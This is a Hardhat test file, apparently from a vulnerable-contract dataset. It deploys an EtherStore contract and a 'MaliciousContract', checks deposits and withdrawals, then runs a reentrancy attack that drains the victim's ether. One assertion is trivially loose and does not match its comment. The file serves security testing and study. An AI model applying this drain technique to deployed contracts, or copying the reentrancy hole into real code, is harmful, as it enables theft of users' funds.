const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const fs = require("fs");
describe("Reentrancy Attack for etherstore.sol", function () {
  let EtherStore;
  let victim;
  let MaliciousContract;
  let hacker;
  let Log;
  let log;

  beforeEach(async function () {
    // Deploy Log contract

    // Deploy EtherStore contract with Log address
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/reentrancy/etherstore.sol/EtherStore.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    EtherStore = await ethers.getContractFactory(json.abi, json.bytecode);
    victim = await EtherStore.deploy();
    await victim.waitForDeployment();
    //await victim.setLog(log.target); // Set Log address after deployment

    // Deploy MaliciousContract with EtherStore address
    MaliciousContract = await ethers.getContractFactory(
      "contracts/reentrancy/etherstore_attack.sol:MaliciousContract",
    );
    hacker = await MaliciousContract.deploy(victim.target);
  });

  it("functional check: reentrancy/etherstore.sol", async function () {
    const [v, a] = await ethers.getSigners();
    const amount = ethers.parseEther("1");
    //oracle: verify that depositFunds on EtherStore works as expected
    await expect(victim.connect(a).depositFunds({ value: amount })).to.not.be
      .reverted;
    expect(await ethers.provider.getBalance(victim.target)).to.equal(amount);
    const balanceBefore = await ethers.provider.getBalance(a.address);

    //oracle: verify that withdrawFunds on EtherStore works as expected
    const tx = await victim.connect(a).withdrawFunds(amount);
    const receipt = await tx.wait();
    const gasFee = receipt.gasUsed * receipt.gasPrice;
    expect(await ethers.provider.getBalance(victim.target)).to.equal(0);
    expect(await ethers.provider.getBalance(a.address)).to.equal(
      balanceBefore + amount - gasFee,
    );
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.depositFunds({ value: ethers.parseEther("5") });

    const victimInitialBalance = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimInitialBalance).to.equal(ethers.parseEther("5"));

    // Initial deposit from hacker on victim contract
    await hacker.deposit({ value: ethers.parseEther("2") });

    const victimBalanceAfterDeposit = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("7"));

    // Set hacker balance to 0
    await network.provider.send("hardhat_setBalance", [hacker.target, "0x0"]);
    let hackerBalance = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalance).to.equal(0);

    // Perform reentrancy attack through MaliciousContract
    await hacker.attack(ethers.parseEther("1"));

    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(victim.target);
    hackerBalance = await ethers.provider.getBalance(hacker.target);

    // Verify the attack was successful

    // victim has lost more funds than the hacker balance (7-2=5)
    expect(victimBalance).to.be.below(ethers.parseEther("8"));

    // hacker has more than the hacker baance on victim
    expect(hackerBalance).to.be.above(ethers.parseEther("1"));
  });
});
